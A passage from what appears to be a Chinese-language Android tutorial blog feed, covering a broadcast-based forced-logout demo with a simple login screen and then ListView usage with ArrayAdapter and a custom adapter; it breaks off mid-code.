class="string">&quot;90dp&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;密码:&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">&quot;18sp&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/login&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;60dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;登录&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后基于BaseActivity这个基类创建一个登陆的派生类，判断登陆的信息，跳转到主活动，同时把这个登陆类在注册文件中设置为启动活动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> EditText accountEdit;</span><br><span class="line">    <span class="keyword">private</span> EditText passwordEdit;</span><br><span class="line">    <span class="keyword">private</span> Button login;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_login);</span><br><span class="line">        accountEdit=(EditText) findViewById(R.id.account);</span><br><span class="line">        passwordEdit=(EditText) findViewById(R.id.password);</span><br><span class="line">        login=(Button) findViewById(R.id.login);</span><br><span class="line">        login.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String account=accountEdit.getText().toString();</span><br><span class="line">                String password=passwordEdit.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(account.equals(<span class="string">&quot;admin&quot;</span>)&amp;&amp;password.equals(<span class="string">&quot;123&quot;</span>))&#123;</span><br><span class="line">                    Intent intent =<span class="keyword">new</span> Intent(LoginActivity.<span class="keyword">this</span>,MainActivity.class);</span><br><span class="line">                    startActivity(intent);</span><br><span class="line">                    finish();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(LoginActivity.<span class="keyword">this</span>,<span class="string">&quot;账号或者密码错误&quot;</span>,Toast.LENGTH_SHORT).show(); </span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.LoginActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 动态注册</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">BaseActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button forceOffline=(Button) findViewById(R.id.force_offline);</span><br><span class="line">        forceOffline.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Intent intent=<span class="keyword">new</span> Intent(<span class="string">&quot;com.example.broadcastbestpractice.FOR_OFFLINE&quot;</span>);</span><br><span class="line">                sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在按钮事件发送了一条广播</p><p><strong>接下来需要做的是创建一个广播接收器，由于所有窗口都应该有这个广播接收然进行强制下线的一个操作，所以这个强制下线的操作应该是写在广播接收器，然后这个广播接收器写在所有窗口的基类，这样接收到广播之后，不管任何窗口都能进行一个响应，如果创建的是一个静态注册的广播接收器，是没有办法在子进程onReceiv( )控制UI控件</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onResume();</span><br><span class="line">    IntentFilter intentFilter=<span class="keyword">new</span> IntentFilter();</span><br><span class="line">    intentFilter.addAction(<span class="string">&quot;com.example.broadcastbestpractice.FOR_OFFLINE&quot;</span>);</span><br><span class="line">    receiver=<span class="keyword">new</span> ForceOfflineReceiver();</span><br><span class="line">    registerReceiver(receiver,intentFilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onPause();</span><br><span class="line">    <span class="keyword">if</span>(receiver!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        unregisterReceiver(receiver);</span><br><span class="line">        receiver=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForceOfflineReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(<span class="keyword">final</span> Context context , Intent intent)</span></span>&#123;</span><br><span class="line">        AlertDialog.Builder builder=<span class="keyword">new</span> AlertDialog.Builder(context);</span><br><span class="line">        builder.setTitle(<span class="string">&quot;警告&quot;</span>);</span><br><span class="line">        builder.setMessage(<span class="string">&quot;你被强制下线，请重新登录一次&quot;</span>);</span><br><span class="line">        builder.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">        builder.setPositiveButton(<span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                ActicityCollector.finshAll();</span><br><span class="line">                Intent intent=<span class="keyword">new</span> Intent(context,LoginActivity.class);</span><br><span class="line">                context.startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        builder.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写onCreate( )和onDestroy( )方法里来注册和取消广播器，但是这次我们要求的时只有处于栈顶的活动才能接受到这条强制下线的的广播，非栈顶的活动不应该也没必要去接收这条广播</p><p><img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200926101015869.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200926101015869.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200926101015869"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-ListView控件</title>
      <link href="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/"/>
      <url>/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简单应用"><a href="#1-简单应用" class="headerlink" title="1.简单应用"></a>1.简单应用</h2><p>布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/list_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在MainAcivity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String data[]=&#123;<span class="string">&quot;APPLE&quot;</span>,<span class="string">&quot;HUAWEI&quot;</span>,<span class="string">&quot;XIAOMI&quot;</span>,<span class="string">&quot;MEIZU&quot;</span>,<span class="string">&quot;ZHONGXING&quot;</span>,<span class="string">&quot;LENOVO&quot;</span>&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ArrayAdapter&lt;String&gt;adapter=<span class="keyword">new</span> ArrayAdapter&lt;String&gt;(MainActivity.<span class="keyword">this</span>,android.R.layout.simple_list_item_1,data);</span><br><span class="line">        ListView listView=(ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果<img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200922235315792.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200922235315792.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922235315792"></p><p>首先定义了一个字符串数组存数据，<strong>数组中的数据是无法直接传递给ListView的，仍然需要借助适配器</strong></p><p>实现过程：新建适配器-&gt;添加数据源到适配器-&gt;视图加载适配器</p><p>Android中提供了很多适配器的实现类，这次使用的是ArrayAdapter，可以通过泛型来指定要适配的数据类型，然后再构造函数中把要适配的数据传入。ArrayAdapter有多个构造函数重载，由与我们提供的数据都为字符串，所有泛型指定为String，然后再ArrayAdapter的构造函数中依次传入 <strong>当前的上下文</strong>、<strong>ListView的子项布局的id</strong> 以及<strong>要适配的数据</strong></p><p>这里使用了<code>android.R.layout.simple_list_item_1</code>作为ListView子项布局的id，这是一个Android内置的布局文件，里面只有一个TexView，可用于显示一段文本，这样适配器的对象就构建好了</p><p>最后，通过调用ListView的setAdapter( )方法，将构建好的适配器对象传递进去，这样ListView和数据之间的关联就建立完成</p><h2 id="2-定制ListView界面"><a href="#2-定制ListView界面" class="headerlink" title="2.定制ListView界面"></a>2.定制ListView界面</h2><p>实现原理：通过创建一个自定义类，类似于String类型，然后对这个自定义类进行一个布局文件的创建，这个布局文件主要用在建立一个适配器的排列方式，然后建立一个基于ArrayAdapter的一个派生类，重写里面的构造函数以及getView( )函数 </p><p>定义一个实体类，作为ListView适配器的适配类型，新建hero hero.java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listviewtest;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hero</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> imageid;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">hero</span><span class="params">(String name,<span class="keyword">int</span> imageid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.imageid=imageid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getImageid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> imageid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要为ListView的每一个子项指定一个布局文件，新建hero_item.xml 代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/hero_image&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/hero_name&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginLeft</span>=<span class="string">&quot;10dp&quot;</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这个布局中主要定义的是一个ImageView用于去显示英雄的图片，而且定义了一个TextView用于显示英雄的名称，并且让TextView在垂直方向上居中显示</p><p>接下来类似于上面的泛型适配器，需要自定义一个适配器，能容纳hero这个类的，新建HeroAdapter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeroAdapter</span> <span class="keyword">extends</span> <span class="title">ArrayAdapter</span>&lt;<span class="title">hero</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> resouceId;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HeroAdapter</span><span class="params">(Context context, <span class="keyword">int</span> textViewResouceId, List&lt;hero&gt; objects)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context,textViewResouceId,objects);</span><br><span class="line">        resouceId=textViewResouceId;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> position, View converView, ViewGroup patrent)</span></span>&#123;</span><br><span class="line">        hero hero_temp=getItem(position);</span><br><span class="line">        View view= LayoutInflater.from(getContext()).inflate(resouceId,patrent,<span class="keyword">false</span>);</span><br><span class="line">        ImageView heroImage=(ImageView)view.findViewById(R.id.hero_image);</span><br><span class="line">        TextView heroName=(TextView) view.findViewById(R.id.hero_name);</span><br><span class="line">        heroImage.setImageResource(hero_temp.getImageid());</span><br><span class="line">        heroName.setText(hero_temp.getName());</span><br><span class="line">        <span class="keyword">return</span>  view;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <code>public HeroAdapter(Context context, int textViewResouceId, List&lt;hero&gt; objects)</code>重写了父类的一组构造函数，将<strong>上下文</strong>，<strong>ListView子项的布局的id</strong>和<strong>数据</strong>。</p><p>另外重写了getView( )方法，首先通过getItem方法得到当前的hero实例，然后使用<code>LayoutInflater.from(getContext()).inflate(resouceId,patrent,false)</code>加载传入布局</p><p><img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200923005111303.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200923005111303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200923005111303"></p><p>调用View的findViewId( )获取到Image</p><p>View和TextView实例， 用下列语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heroImage.setImageResource(hero_temp.getImageid());</span><br><span class="line">heroName.setText(hero_temp.getName());</span><br></pre></td></tr></table></figure><p>显示图片和文字，最后将布局返回，这样自定义的适配器就完成</p><p>最后再MainActivity中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;hero&gt; herolist=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">//为列表中添数据</span></span><br><span class="line">        inithero();</span><br><span class="line">        <span class="comment">//通过列表中的数据添加一个适配器</span></span><br><span class="line">        HeroAdapter adapter=<span class="keyword">new</span> HeroAdapter(MainActivity.<span class="keyword">this</span>,R.layout.fruit_item,herolist);</span><br><span class="line">        ListView listView=(ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inithero</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">            hero anni=<span class="keyword">new</span> hero(<span class="string">&quot;安妮&quot;</span>,R.drawable.anni);</span><br><span class="line">            herolist.add(anni);</span><br><span class="line">            hero lunzima=<span class="keyword">new</span> hero(<span class="string">&quot;轮子妈&quot;</span>,R.drawable.lunzima);</span><br><span class="line">            herolist.add(lunzima);</span><br><span class="line">            hero nvqiang=<span class="keyword">new</span> hero(<span class="string">&quot;女枪&quot;</span>,R.drawable.nvqiang);</span><br><span class="line">            herolist.add(nvqiang);</span><br><span class="line">            hero xiazi=<span class="keyword">new</span> hero(<span class="string">&quot;瞎子&quot;</span>,R.drawable.xiazi);</span><br><span class="line">            herolist.add(xiazi);</span><br><span class="line">            hero timo=<span class="keyword">new</span> hero(<span class="string">&quot;提莫&quot;</span>,R.drawable.timo);</span><br><span class="line">            herolist.add(timo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先用intihero( )去初始所有的英雄,将hero的构造函数将水果和图片id传入，然后把创建好的对象添加到水果列表中，接着onCreate( )方法创建了HeroAdapter对象，最后将adapter作为适配器传给ListView 这样就完成</p><p><img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200923010037326.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200923010037326.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200923010037326"></p><h2 id="3-提升ListView运行速率"><a href="#3-提升ListView运行速率" class="headerlink" title="3.提升ListView运行速率"></a>3.提升ListView运行速率</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">View view;</span><br><span class="line"><span class="keyword">if</span>(converView==<span class="keyword">null</span>)&#123;</span><br><span class="line">    view= 